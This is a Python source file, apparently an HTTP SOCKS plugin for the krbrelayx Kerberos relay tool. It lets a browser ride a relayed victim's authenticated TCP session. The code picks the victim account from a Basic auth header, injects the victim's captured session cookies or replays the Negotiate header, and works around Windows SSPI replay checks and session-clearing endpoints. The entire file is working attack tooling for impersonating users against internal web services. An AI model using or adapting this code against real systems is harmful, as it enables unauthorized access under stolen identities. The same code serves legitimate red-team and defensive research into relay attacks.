"""HTTP SOCKS plugin for krbrelayx.

Pipes raw HTTP traffic from a browser onto the still-open TCP socket left
behind by a successful Kerberos AP-REQ relay. The browser identifies
which relayed user it wants to ride by sending HTTP Basic auth
`<DOMAIN/USER>:`; the plugin strips that header before forwarding so the
upstream Kerberos session is what actually authenticates the request.

Routing per request, in this order:

  1. STUBBED_PATHS from the active profile: answered locally with a
     synthetic 503, never forwarded. Used for endpoints whose real
     responses break the session (Gitea SSE in particular).
  2. STATIC_BYPASS_PREFIXES (universal) and the profile's
     extra_bypass_prefixes: routed off the per-relay lock onto a fresh
     per-request TCP connection. Lets static assets parallelize.
  3. Everything else: queued through the persistent authenticated relay
     socket with cookies (preferred) or a Negotiate replay (fallback).

Target-specific behavior (login path, cookie filters, SSE stubs, extra
bypass prefixes) is supplied by a routing profile carried with the
relay registration. See lib/utils/socksprofiles.py.
"""
import base64
import socket as _socket

from impacket import LOG
from impacket.examples.ntlmrelayx.servers.socksserver import SocksRelay

PLUGIN_CLASS = "KrbHTTPSocksRelay"
EOL = b'\r\n'
HEADER_END = EOL + EOL

# Universal static-asset prefixes. These are routed onto fresh
# per-request TCP connections regardless of profile. Almost every web
# app serves these unauthenticated, and bypassing them lets the dozens
# of parallel asset fetches a typical page load fires actually
# parallelize instead of stacking up behind one another.
STATIC_BYPASS_PREFIXES = (
    b'/assets/',
    b'/img/',
    b'/favicon.',
    b'/robots.txt',
    b'/sitemap.xml',
    b'/manifest.webmanifest',
    b'/serviceworker.js',
)


class KrbHTTPSocksRelay(SocksRelay):
    PLUGIN_NAME = 'Krb HTTP Socks Plugin'
    PLUGIN_SCHEME = 'HTTP'

    def __init__(self, targetHost, targetPort, socksSocket, activeRelays):
        SocksRelay.__init__(self, targetHost, targetPort, socksSocket, activeRelays)
        self.packetSize = 8192
        self.relaySocket = None
        self.session = None
        # Filled in once we know which user we're tunneling for.
        self.negotiate_header = None
        # Session cookies captured by the relay client at auth time.
        # Preferred over replaying the AP-REQ because Windows SSPI
        # rejects authenticator replays with SEC_E_LOGON_DENIED.
        self.session_cookies = []
        # Lock currently held on the relay (acquired in
        # skipAuthentication, released by the SOCKS server when the
        # tunnel ends).
        self._held_lock = None

        # Pull the routing profile out of the active relay registry.
        # Default to empty so the plugin behaves as a plain SOCKS proxy
        # when no profile was supplied.
        profile = {}
        if activeRelays:
            data = activeRelays.get('data') or {}
            profile = data.get('profile') or {}
        self._stubbed_paths = profile.get('stubbed_paths', frozenset())
        self._cookies_never_reinject = profile.get('cookies_never_reinject', frozenset())
        self._bypass_prefixes = (
            STATIC_BYPASS_PREFIXES + tuple(profile.get('extra_bypass_prefixes', ()))
        )

    def releaseRelay(self):
        """Release the per-relay lock. Idempotent. Called by the SOCKS
        server when the tunnel ends, on success or on exception."""
        if self._held_lock is not None:
            try:
                self._held_lock.release()
            except RuntimeError:
                pass
            self._held_lock = None
            if self.username and self.username in self.activeRelays:
                self.activeRelays[self.username]['inUse'] = False

    @staticmethod
    def getProtocolPort():
        return 80

    def initConnection(self):
        # Nothing to do. The relay socket is already authenticated and
        # idle by the time the SOCKS server hands us a request.
        pass

    # ------------------------------------------------------------------
    # request/response framing
    # ------------------------------------------------------------------
    def _read_full_request(self, first_chunk):
        """Read until we have all the headers and any declared body."""
        data = first_chunk
        while HEADER_END not in data:
            chunk = self.socksSocket.recv(self.packetSize)
            if not chunk:
                return data
            data += chunk
        header_end = data.find(HEADER_END) + 4
        headers = self._parse_headers(data[:header_end - 4])
        body_size = 0
        if 'content-length' in headers:
            try:
                body_size = int(headers['content-length'])
            except ValueError:
                body_size = 0
        while len(data) - header_end < body_size:
            chunk = self.socksSocket.recv(self.packetSize)
            if not chunk:
                break
            data += chunk
        return data

    @staticmethod
    def _parse_headers(headers_blob):
        out = {}
        for line in headers_blob.split(EOL):
            if b':' not in line:
                continue
            key, _, val = line.partition(b':')
            out[key.decode('latin-1').strip().lower()] = val.decode('latin-1').strip()
        return out

    def _rewrite_request(self, data):
        """Strip the browser's SOCKS-only Authorization header, force
        keep-alive, and stamp on whichever auth credentials we have.

        Cookie policy: merge browser-supplied cookies with the captured
        ones, with the browser's values winning on duplicate names.
        Negotiate policy: only inject the AP-REQ Authorization header
        when no session cookie is available, since each replay of the
        same authenticator is single-use against Windows SSPI.
        """
        header_end = data.find(HEADER_END)
        if header_end == -1:
            return data
        head = data[:header_end]
        body = data[header_end + 4:]
        request_line = head.split(EOL, 1)[0]

        rewritten_lines = []
        saw_connection = False
        existing_cookie = None
        cookie_index = None
        for line in head.split(EOL):
            lower = line.lower()
            if lower.startswith(b'authorization:'):
                continue
            if lower.startswith(b'proxy-authorization:'):
                continue
            if lower.startswith(b'proxy-connection:'):
                continue
            if lower.startswith(b'connection:'):
                rewritten_lines.append(b'Connection: keep-alive')
                saw_connection = True
                continue
            if lower.startswith(b'cookie:'):
                existing_cookie = line.partition(b':')[2].strip()
                cookie_index = len(rewritten_lines)
                rewritten_lines.append(line)
                continue
            rewritten_lines.append(line)
        if not saw_connection:
            rewritten_lines.append(b'Connection: keep-alive')

        merged_cookie = self._merge_cookies(existing_cookie)
        if merged_cookie:
            if cookie_index is not None:
                rewritten_lines[cookie_index] = b'Cookie: ' + merged_cookie
            else:
                rewritten_lines.append(b'Cookie: ' + merged_cookie)

        send_negotiate = bool(self.negotiate_header) and not merged_cookie
        if send_negotiate:
            rewritten_lines.append(b'Authorization: ' + self.negotiate_header.encode('latin-1'))
            LOG.debug('SOCKS HTTP: forwarding %s with Negotiate (no cookies available)' %
                      request_line.decode('latin-1', 'replace'))
        elif merged_cookie:
            LOG.debug('SOCKS HTTP: forwarding %s with cookies (Negotiate suppressed)' %
                      request_line.decode('latin-1', 'replace'))
        else:
            LOG.warning('SOCKS HTTP: forwarding %s without auth, server will likely reject' %
                        request_line.decode('latin-1', 'replace'))
        return EOL.join(rewritten_lines) + HEADER_END + body

    def _merge_cookies(self, browser_cookie_value):
        """Combine the browser's Cookie header with our pre-auth cookies.

        Dedupes by cookie name with the browser's value winning. The
        target may rotate session cookies on activity, so the browser
        holds the freshest values; ours are frozen at relay-setup time.
        Letting our stale value land alongside the browser's fresh one
        leaves the server picking one non-deterministically and the
        session randomly going anonymous.

        Cookies named in the active profile's cookies_never_reinject
        set are skipped entirely. Used for handshake-context cookies
        whose server-side state is gone after the pre-auth window
        (e.g. websspi).
        """
        seen = set()
        merged = []
        if browser_cookie_value:
            for piece in browser_cookie_value.split(b';'):
                piece = piece.strip()
                if not piece or b'=' not in piece:
                    continue
                name = piece.split(b'=', 1)[0].strip()
                if not name or name in seen:
                    continue
                seen.add(name)
                merged.append(piece)
        for cookie in self.session_cookies:
            name_str, _, _ = cookie.partition('=')
            name = name_str.strip().encode('latin-1')
            if name in self._cookies_never_reinject:
                continue
            if name in seen:
                continue
            seen.add(name)
            merged.append(cookie.encode('latin-1'))
        return b'; '.join(merged) if merged else b''

    def _send_to_browser(self, data):
        """Best-effort write back to the SOCKS client. Returns False if
        the browser hung up. Important so BrokenPipeError doesn't
        propagate up the stack, where the SOCKS server would mistake it
        for the relay socket dying and evict our still-good session.
        """
        try:
            self.socksSocket.sendall(data)
            return True
        except (BrokenPipeError, ConnectionResetError, OSError) as e:
            LOG.debug('SOCKS HTTP: browser hung up (%s); dropping rest of response, '
                      'relay session kept' % e)
            return False

    def _forward_response(self):
        """Stream the relay's response back to the SOCKS client.

        Sends only the response headers up front. Body bytes are
        forwarded by whichever framing-specific path is appropriate, so
        we never double-write any chunk. Returns True if a full response
        was forwarded (or the browser hung up cleanly), False only if
        the relay socket itself failed mid-response.
        """
        data = b''
        while HEADER_END not in data:
            chunk = self.relaySocket.recv(self.packetSize)
            if not chunk:
                if data:
                    self._send_to_browser(data)
                return False
            data += chunk

        header_end = data.find(HEADER_END) + 4
        headers = self._parse_headers(data[:header_end - 4])

        if not self._send_to_browser(data[:header_end]):
            return True
        body_so_far = data[header_end:]

        if 'content-length' in headers:
            try:
                body_size = int(headers['content-length'])
            except ValueError:
                return False
            if body_so_far and not self._send_to_browser(body_so_far):
                return True
            remaining = body_size - len(body_so_far)
            while remaining > 0:
                chunk = self.relaySocket.recv(min(self.packetSize, remaining))
                if not chunk:
                    return False
                if not self._send_to_browser(chunk):
                    # Drain the rest from the relay so the next response
                    # starts at the correct boundary, then return.
                    remaining -= len(chunk)
                    while remaining > 0:
                        try:
                            extra = self.relaySocket.recv(min(self.packetSize, remaining))
                        except OSError:
                            return False
                        if not extra:
                            return False
                        remaining -= len(extra)
                    return True
                remaining -= len(chunk)
            return True

        if headers.get('transfer-encoding', '').lower() == 'chunked':
            return self._stream_chunked(body_so_far)

        # 1xx / 204 / 304 carry no body.
        try:
            status = int(data.split(b' ', 2)[1])
        except (IndexError, ValueError):
            status = 200
        if status in (204, 304) or (100 <= status < 200):
            if body_so_far:
                self._send_to_browser(body_so_far)
            return True

        # Connection-close framing as a last resort. A short read
        # timeout keeps the relay from being locked indefinitely.
        if body_so_far and not self._send_to_browser(body_so_far):
            return True
        self.relaySocket.settimeout(2.0)
        try:
            while True:
                chunk = self.relaySocket.recv(self.packetSize)
                if not chunk:
                    break
                if not self._send_to_browser(chunk):
                    break
        except OSError:
            pass
        finally:
            try:
                self.relaySocket.settimeout(None)
            except OSError:
                pass
        return True

    def _stream_chunked(self, body_so_far):
        """Forward an HTTP/1.1 chunked-encoded body byte-for-byte.

        `body_so_far` is whatever body bytes arrived in the same TCP
        segment as the response headers. The caller must NOT have
        already forwarded those bytes; this function owns the body
        forwarding.
        """
        buf = body_so_far
        browser_alive = True
        while True:
            while EOL not in buf:
                chunk = self.relaySocket.recv(self.packetSize)
                if not chunk:
                    return False
                buf += chunk

            size_line, _, rest = buf.partition(EOL)
            try:
                chunk_size = int(size_line.split(b';', 1)[0].strip(), 16)
            except ValueError:
                return False
            buf = rest

            if browser_alive:
                browser_alive = self._send_to_browser(size_line + EOL)

            need = chunk_size + 2
            while len(buf) < need:
                chunk = self.relaySocket.recv(self.packetSize)
                if not chunk:
                    return False
                buf += chunk
            if browser_alive:
                browser_alive = self._send_to_browser(buf[:need])
            buf = buf[need:]

            if chunk_size == 0:
                return True

    # ------------------------------------------------------------------
    # routing helpers
    # ------------------------------------------------------------------
    def _is_static_request(self, request_data):
        """True if the request should be routed off the relay socket.

        Combines the universal static-asset prefixes with whatever
        extra prefixes the active profile contributes.
        """
        line = request_data.split(EOL, 1)[0]
        parts = line.split(b' ', 2)
        if len(parts) < 2:
            return False
        method, path = parts[0], parts[1].split(b'?', 1)[0]
        if method not in (b'GET', b'HEAD'):
            return False
        return any(path.startswith(p) for p in self._bypass_prefixes)

    def _stub_path(self, request_data):
        """Return the matched stubbed path from the active profile, or None."""
        if not self._stubbed_paths:
            return None
        line = request_data.split(EOL, 1)[0]
        parts = line.split(b' ', 2)
        if len(parts) < 2:
            return None
        path = parts[1].split(b'?', 1)[0]
        return path if path in self._stubbed_paths else None

    def _serve_stub_response(self, path):
        """Synthesize a benign 503 to the browser without contacting
        the target. Used for endpoints (typically SSE) whose real
        responses tend to log the user out by way of session-clearing
        Set-Cookie headers.
        """
        LOG.debug('SOCKS HTTP: stubbing %s, not contacting target' % path.decode())
        self._send_to_browser(
            b'HTTP/1.1 503 Service Unavailable\r\n'
            b'Content-Type: text/event-stream\r\n'
            b'Cache-Control: no-cache\r\n'
            b'Content-Length: 0\r\n'
            b'Connection: close\r\n\r\n'
        )

    def _rewrite_static_request(self, data):
        """Prepare a request for the static-bypass path.

        Strips the SOCKS-only Basic header, forces Connection: close on
        the per-request upstream, and passes captured cookies through
        without re-injecting Negotiate. Replaying the AP-REQ here would
        punch the SSPI replay cache repeatedly and on Windows SSPI
        targets that can cause the server to invalidate the session
        entirely.
        """
        header_end = data.find(HEADER_END)
        if header_end == -1:
            return data
        head = data[:header_end]
        body = data[header_end + 4:]
        rewritten_lines = []
        cookie_index = None
        existing_cookie = None
        for line in head.split(EOL):
            lower = line.lower()
            if lower.startswith(b'authorization:'):
                continue
            if lower.startswith(b'proxy-authorization:'):
                continue
            if lower.startswith(b'connection:'):
                rewritten_lines.append(b'Connection: close')
                continue
            if lower.startswith(b'proxy-connection:'):
                continue
            if lower.startswith(b'cookie:'):
                existing_cookie = line.partition(b':')[2].strip()
                cookie_index = len(rewritten_lines)
            rewritten_lines.append(line)
        if not any(l.lower().startswith(b'connection:') for l in rewritten_lines):
            rewritten_lines.append(b'Connection: close')
        merged_cookie = self._merge_cookies(existing_cookie)
        if merged_cookie:
            if cookie_index is not None:
                rewritten_lines[cookie_index] = b'Cookie: ' + merged_cookie
            else:
                rewritten_lines.append(b'Cookie: ' + merged_cookie)
        return EOL.join(rewritten_lines) + HEADER_END + body

    def _bypass_relay_for_static(self, request_data):
        """Fetch a static asset on a fresh per-request TCP connection
        instead of the per-relay socket. Returns False so the SOCKS
        server closes the SOCKS-side connection cleanly afterwards;
        the response is already served and no tunnel loop is needed.
        """
        try:
            upstream = _socket.create_connection(
                (self.targetHost, self.targetPort), timeout=15)
        except OSError as e:
            LOG.error('SOCKS HTTP: static-bypass connect to %s:%s failed: %s'
                      % (self.targetHost, self.targetPort, e))
            self._send_to_browser(
                b'HTTP/1.1 502 Bad Gateway\r\n'
                b'Content-Length: 0\r\n'
                b'Connection: close\r\n\r\n'
            )
            return False
        request_line = request_data.split(EOL, 1)[0].decode('latin-1', 'replace')
        LOG.debug('SOCKS HTTP: static bypass %s' % request_line)
        rewritten = self._rewrite_static_request(request_data)
        # Temporarily swap the relay socket so _forward_response reads
        # from the per-asset upstream rather than the shared relay.
        saved = self.relaySocket
        self.relaySocket = upstream
        try:
            try:
                upstream.sendall(rewritten)
            except OSError as e:
                LOG.error('SOCKS HTTP: static-bypass send failed: %s' % e)
                return False
            self._forward_response()
        finally:
            self.relaySocket = saved
            try:
                upstream.close()
            except Exception:
                pass
        return False

    def _do_pipelined_bypass(self, request_data):
        """Like _bypass_relay_for_static, but doesn't ask the SOCKS
        server to close the SOCKS-side connection; the outer
        tunnelConnection loop wants to keep handling more pipelined
        requests on the same browser socket.
        """
        try:
            upstream = _socket.create_connection(
                (self.targetHost, self.targetPort), timeout=15)
        except OSError as e:
            LOG.error('SOCKS HTTP: pipelined-bypass connect failed: %s' % e)
            return
        rewritten = self._rewrite_static_request(request_data)
        saved = self.relaySocket
        self.relaySocket = upstream
        try:
            try:
                upstream.sendall(rewritten)
            except OSError as e:
                LOG.error('SOCKS HTTP: pipelined-bypass send failed: %s' % e)
                return
            self._forward_response()
        finally:
            self.relaySocket = saved
            try:
                upstream.close()
            except Exception:
                pass

    # ------------------------------------------------------------------
    # SOCKS plugin entry points
    # ------------------------------------------------------------------
    def skipAuthentication(self):
        first = self.socksSocket.recv(self.packetSize)
        if not first:
            return False
        request = self._read_full_request(first)

        # Stubbed endpoints: serve locally, never contact the target.
        stub = self._stub_path(request)
        if stub:
            self._serve_stub_response(stub)
            return False

        # Static asset fast path: no auth needed, no relay lock needed,
        # opens a fresh TCP per request so multiple browser asset
        # fetches parallelize naturally.
        if self._is_static_request(request):
            return self._bypass_relay_for_static(request)

        headers = self._parse_headers(request[:request.find(HEADER_END)])
        creds = headers.get('authorization')
        if not creds or not creds.lower().startswith('basic '):
            LOG.debug('SOCKS HTTP: prompting browser for Basic auth')
            challenge = (
                b'HTTP/1.1 401 Unauthorized\r\n'
                b'WWW-Authenticate: Basic realm="krbrelayx - DOMAIN/username"\r\n'
                b'Connection: close\r\n'
                b'Content-Length: 0\r\n\r\n'
            )
            try:
                self.socksSocket.sendall(challenge)
            except OSError:
                pass
            return False

        try:
            decoded = base64.b64decode(creds.split(' ', 1)[1]).decode('utf-8', 'replace')
        except Exception:
            return False
        user_part = decoded.split(':', 1)[0]
        if '@' in user_part:
            user, domain = user_part.split('@', 1)
            user_part = '%s/%s' % (domain.split('.')[0], user)
        self.username = user_part.upper()

        if self.username not in self.activeRelays:
            LOG.error('SOCKS HTTP: no relay for %s@%s(%s)' % (
                self.username, self.targetHost, self.targetPort))
            return False

        # Wait in line for the relay's TCP socket. Browsers fan out
        # roughly six parallel requests per page; if the rest got 503'd,
        # CSS and JS would never finish loading. Queueing makes them
        # load sequentially: slower than truly parallel but correct.
        relay_lock = self.activeRelays[self.username].get('lock')
        if relay_lock is not None:
            acquired = relay_lock.acquire(timeout=30.0)
            if not acquired:
                LOG.error('SOCKS HTTP: relay for %s@%s(%s) busy for 30s, giving up'
                          % (self.username, self.targetHost, self.targetPort))
                self._send_to_browser(
                    b'HTTP/1.1 504 Gateway Timeout\r\n'
                    b'Content-Length: 0\r\n'
                    b'Connection: close\r\n\r\n'
                )
                return False
            self._held_lock = relay_lock
        self.activeRelays[self.username]['inUse'] = True

        LOG.info('SOCKS HTTP: tunneling browser session as %s@%s(%s)' % (
            self.username, self.targetHost, self.targetPort))
        protocol_client = self.activeRelays[self.username]['protocolClient']
        self.session = protocol_client.session
        self.relaySocket = self.session.sock
        self.negotiate_header = getattr(protocol_client, 'negotiate_header', None)
        self.session_cookies = list(getattr(protocol_client, 'session_cookies', []))
        creds_summary = []
        if self.session_cookies:
            creds_summary.append('%d cookie(s) [%s]' % (
                len(self.session_cookies),
                ', '.join(c.split('=', 1)[0] for c in self.session_cookies)))
        if self.negotiate_header:
            creds_summary.append('Negotiate header (%d bytes)' % len(self.negotiate_header))
        if creds_summary:
            LOG.debug('SOCKS HTTP: %s tunneled requests will carry: %s'
                      % (self.username, ' + '.join(creds_summary)))
        else:
            LOG.warning('SOCKS HTTP: no auth state on protocolClient for %s; '
                        'tunneled requests will be unauthenticated' % self.username)

        forward = self._rewrite_request(request)
        try:
            self.relaySocket.sendall(forward)
        except OSError as e:
            LOG.error('SOCKS HTTP: relay socket send failed: %s', e)
            return False
        if not self._forward_response():
            return False
        return True

    def tunnelConnection(self):
        while True:
            try:
                first = self.socksSocket.recv(self.packetSize)
            except OSError:
                return
            if not first:
                return
            request = self._read_full_request(first)

            # Stubbed endpoints get the same local fake response on
            # pipelined requests too. They never reach the target.
            stub = self._stub_path(request)
            if stub:
                self._serve_stub_response(stub)
                continue

            # Pipelined static requests should also bypass the lock.
            if self._is_static_request(request):
                request_line = request.split(EOL, 1)[0].decode('latin-1', 'replace')
                LOG.debug('SOCKS HTTP: static bypass (pipelined) %s' % request_line)
                self._do_pipelined_bypass(request)
                continue

            forward = self._rewrite_request(request)
            try:
                self.relaySocket.sendall(forward)
            except OSError as e:
                LOG.error('SOCKS HTTP: relay socket send failed mid-tunnel: %s', e)
                return
            if not self._forward_response():
                return
